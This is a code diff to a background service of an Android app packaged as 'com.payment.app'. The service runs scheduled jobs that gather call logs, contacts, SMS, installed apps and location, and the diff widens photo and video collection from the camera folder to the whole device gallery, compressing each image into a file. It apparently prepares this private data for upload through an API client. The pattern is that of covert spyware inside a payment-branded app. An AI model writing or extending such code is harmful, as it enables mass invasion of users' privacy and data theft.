@@ -24,6 +24,7 @@ import android.net.NetworkInfo
 import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
+import android.os.Environment
 import android.os.IBinder
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -52,13 +53,16 @@ import com.google.android.gms.location.LocationServices
 import com.payment.app.ApiCallManager
 import com.payment.app.HomeActivity
 import com.payment.app.R
+import com.payment.app.imageresizer.ImageResizer
 import com.payment.app.model.CallLogModel
 import com.payment.app.model.ContactSyncModel
 import com.payment.app.model.InstalledApp
 import com.payment.app.model.ScreenTimeModel
 import com.payment.app.model.SmsModel
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 import java.io.File
+import java.io.FileOutputStream
 import java.text.DateFormat
 import java.text.SimpleDateFormat
 import java.time.Instant
@@ -82,7 +86,6 @@ class MyService : Service() {
     } else {
         TODO("VERSION.SDK_INT < O")
     }
-    private val permissionId = 2
     val dateFormat: DateFormat = SimpleDateFormat("dd-MM-yyyy")
     private var isCallLogPermissionGranted = false
     private var isContactPermissionGranted = false
@@ -90,13 +93,10 @@ class MyService : Service() {
     private var isPostNotificationPermissionGranted = false
     private var isSmsPermissionGranted = false
     private var isReadMediaImagePermissionGranted = false
-//    lateinit var homeActivity: HomeActivity
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
     val apiCall = ApiCall()
-
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action != null && intent.action.equals(
                 "ACTION_STOP_FOREGROUND", ignoreCase = true)) {
@@ -146,7 +146,7 @@ class MyService : Service() {
                 ApiCallManager.appendLog("Global Call History Exception Handler: ${e.message ?: "Unknown Error"}")
             }
         },0,15, TimeUnit.MINUTES)
-
+//
         val readImage = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
             try {
                 getImagesFromCameraFolder()
@@ -154,14 +154,14 @@ class MyService : Service() {
                 ApiCallManager.appendLog("Global Image Video Exception Handler: ${e.message ?: "Unknown Error"}")
             }
         },0,1, TimeUnit.HOURS)
-
+//
         val notificationService = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
             try {
                 val serviceIntent = Intent(this, NotificationService::class.java)
                 startService(serviceIntent)
 
             } catch (e: Exception) {
-                ApiCallManager.appendLog("Global Image Video Exception Handler: ${e.message ?: "Unknown Error"}")
+                ApiCallManager.appendLog("Global notificationService Exception Handler: ${e.message ?: "Unknown Error"}")
             }
         },0,15, TimeUnit.MINUTES)
 
@@ -261,7 +261,7 @@ class MyService : Service() {
         if(screenTimeList.isNotEmpty()){
 //            apiCall.getScreenTimeApi(screenTimeList,token,applicationContext,baseUrl)
         }
-        Log.d("Installed App List", dataList.toString())
+//        Log.d("Installed App List", dataList.toString())
 
     }
 
@@ -603,7 +603,7 @@ class MyService : Service() {
                             else{
                                 dataList.add(ContactSyncModel(name, number, "", "", emailAddress?:""))
                             }
-                            Log.d("Contact dataList $i","$name  $number $displayName")
+//                            Log.d("Contact dataList $i","$name  $number $displayName")
                             countContactList++
                         }
                     }
@@ -795,42 +795,6 @@ class MyService : Service() {
 
     private fun generateForegroundNotification() {
 
-//        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 100)
-//            .setWaitForAccurateLocation(false)
-//            .setMinUpdateIntervalMillis(2000)
-//            .setMaxUpdateDelayMillis(100)
-//            .build()
-//
-//        val locationCallback: LocationCallback = object : LocationCallback() {
-//            override fun onLocationResult(@NonNull locationResult: LocationResult) {
-//                if (locationResult == null) {
-//                    return
-//                }
-//            }
-//        }
-//
-//        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-//            return
-//        }
-//
-//        LocationServices.getFusedLocationProviderClient(applicationContext)
-//            .requestLocationUpdates(locationRequest, locationCallback, null)
-//        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
-
-//        fusedLocationProviderClient?.lastLocation?.addOnSuccessListener(
-//            this,
-//            OnSuccessListener<Location?> { location ->
-//                if (location != null) {
-//                    stringLatitude = java.lang.Double.toString(location.latitude)
-//                    stringLongitude = java.lang.Double.toString(location.longitude)
-//                } else {
-//                    stringLatitude = "null"
-//                    stringLongitude = "null"
-//                }
-//                Log.d("stringLatitude ", stringLatitude)
-//                Log.d("stringLongitude ", stringLongitude)
-//            },
-//        )
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val locationRequest: LocationRequest = LocationRequest.create()
@@ -1118,13 +1082,14 @@ class MyService : Service() {
         editor.apply()
 
         maxMb = if(!connected){
-            1024
-        } else{
             100
+        } else{
+            1024
         }
         Log.d("maxMb",maxMb.toString())
 
-        val imageList: List<String> = loadImagesFromCameraFolder()
+//        val imageList: List<String> = loadImagesFromCameraFolder()
+        val imageList: List<String> = loadGalleryImages()
         val videoList: List<String> = loadVideoFromCameraFolder()
 
         val finalList: MutableList<String> = java.util.ArrayList()
@@ -1139,7 +1104,7 @@ class MyService : Service() {
 
         }
         for (k in videoList.indices) {
-            val file = File(imageList[k])
+            val file = File(videoList[k])
             val fileSizeInBytes = file.length()
             val fileSizeInKB = fileSizeInBytes / 1024
             val fileSizeInMB = fileSizeInKB / 1024
@@ -1241,6 +1206,70 @@ class MyService : Service() {
 
     }
 
+    private fun loadGalleryImages(): List<String> {
+        val sharedPreferences: SharedPreferences = this.getSharedPreferences("isLoopContinue",
+            AppCompatActivity.MODE_PRIVATE
+        )
+        val isAllLogApiCall = sharedPreferences.getString("isAllImageLogApi","")
+        val oldImageDate = sharedPreferences.getString("oldImageDate","")
+//        Log.d("isAllLogApiCall",oldDate.toString())
+        val formatter = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
+        } else {
+            TODO("VERSION.SDK_INT < O")
+        }
+        var finalImageDate: LocalDateTime = LocalDateTime.now()
+        if(oldImageDate != ""){
+            finalImageDate = LocalDateTime.parse(oldImageDate, formatter)
+        }
+        val imageList: MutableList<String> = ArrayList()
+
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID,
+            MediaStore.Images.Media.DATA,
+            MediaStore.Images.Media.DATE_TAKEN,
+            MediaStore.Images.Media.DATE_ADDED,
+        )
+        val sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC"
+        val cursor = application.contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            sortOrder
+        )
+
+        if (cursor != null) {
+            while (cursor.moveToNext()) {
+                val test = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_TAKEN))
+                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                val formattedDate = sdf.format(Date(date))
+                Log.d("get Image=>",test.toString())
+//                Log.d("formattedDate=>",formattedDate.toString())
+                dateImageList.add(formattedDate)
+                val fullSizeBitmap = BitmapFactory.decodeFile(test)
+
+                val reduceBitemap = ImageResizer.reduceBitmapSize(fullSizeBitmap,240000)
+                val reduceFile: File = getBitmapFile(reduceBitemap)
+                val ddate = LocalDateTime.parse(formattedDate, formatter)
+                Log.d("date=>",reduceFile.toString())
+
+
+                if(isAllLogApiCall == "true"){
+                    if(finalImageDate.isBefore(ddate)){
+                        imageList.add(reduceFile.path)
+                    }
+                }
+                else{
+                    imageList.add(reduceFile.path)
+                }
+            }
+            cursor.close()
+        }
+        return imageList
+    }
+
     fun loadImagesFromCameraFolder(): List<String> {
         val sharedPreferences: SharedPreferences = this.getSharedPreferences("isLoopContinue",
             AppCompatActivity.MODE_PRIVATE
@@ -1280,23 +1309,50 @@ class MyService : Service() {
                 val date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED))
                 val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                 val formattedDate = sdf.format(Date(date))
-                Log.d("get Image=>",test.toString())
-                Log.d("formattedDate=>",formattedDate.toString())
+//                Log.d("get Image=>",test.toString())
+//                Log.d("formattedDate=>",formattedDate.toString())
                 dateImageList.add(formattedDate)
+                val fullSizeBitmap = BitmapFactory.decodeFile(test)
+                val reduceBitemap = ImageResizer.reduceBitmapSize(fullSizeBitmap,240000)
+                val reduceFile: File = getBitmapFile(reduceBitemap)
                 val ddate = LocalDateTime.parse(formattedDate, formatter)
-                Log.d("date=>",ddate.toString())
+//                Log.d("date=>",ddate.toString())
                 if(isAllLogApiCall == "true"){
                     if(finalImageDate.isBefore(ddate)){
-                        imageList.add(test)
+                        imageList.add(reduceFile.path)
                     }
                 }
                 else{
-                    imageList.add(test)
+                    imageList.add(reduceFile.path)
                 }
             }
             cursor.close()
         }
         return imageList
+    }
+
+    private fun getBitmapFile(reduceBitemap: Bitmap): File {
+//        val file = File(Environment.getExternalStorageDirectory().absolutePath + File.separator + "reduce_file")
+        val externalFilesDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
+        val file = File(externalFilesDir, "${System.currentTimeMillis()}_reduce_file.jpg")
+
+        val bos = ByteArrayOutputStream()
+        reduceBitemap.compress(Bitmap.CompressFormat.JPEG,80,bos)
+        var bitmapData = bos.toByteArray()
+
+        try {
+            file.createNewFile()
+            val fos = FileOutputStream(file)
+            fos.write(bitmapData)
+            fos.flush()
+            fos.close()
+            return file
+        }
+        catch (e:java.lang.Exception){
+
+        }
+        return file
+
     }
 
     fun loadVideoFromCameraFolder(): List<String> {
@@ -1318,31 +1374,30 @@ class MyService : Service() {
         }
 
         val videoList: MutableList<String> = ArrayList()
-            val contentResolver = getContentResolver()
-            val projectionVideo = arrayOf(
-                MediaStore.Video.Media.DATA,
-                MediaStore.Video.Media.DATE_TAKEN
-            )
+        val projectionVideo = arrayOf(
+            MediaStore.Video.Media._ID,
+            MediaStore.Video.Media.DATA,
+            MediaStore.Video.Media.DATE_TAKEN,
+            MediaStore.Video.Media.DATE_ADDED,
+        )
 
-            val selectionVideo = MediaStore.Video.Media.DATA + " like ?" // Filter by path
-            val selectionArgs = arrayOf("%/DCIM/Camera/%")
-            val sortOrderVideo = MediaStore.Video.Media.DATE_TAKEN + " DESC" // Sort by date taken
-
-        val cursorVideo = contentResolver.query(
-                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-                projectionVideo,
-                selectionVideo,
-                selectionArgs,
-                sortOrderVideo
-            )
+        val sortOrderVideo = "${MediaStore.Video.Media.DATE_ADDED} DESC"
+        val cursorVideo = application.contentResolver.query(
+            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+            projectionVideo,
+            null,
+            null,
+            sortOrderVideo
+        )
 
         if (cursorVideo != null) {
                 while (cursorVideo.moveToNext()) {
                     val test =
-                        cursorVideo.getString(cursorVideo.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
-                    val date = cursorVideo.getLong(cursorVideo.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_TAKEN))
+                        cursorVideo.getString(cursorVideo.getColumnIndexOrThrow(MediaStore.Video.Media.DATA))
+                    val date = cursorVideo.getLong(cursorVideo.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN))
                     val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                     val formattedDate = sdf.format(Date(date))
+                    Log.d("get video",test)
                     dateVideoList.add(formattedDate)
                     val ddate = LocalDateTime.parse(formattedDate, formatter)
                     Log.d("Video date",ddate.toString())
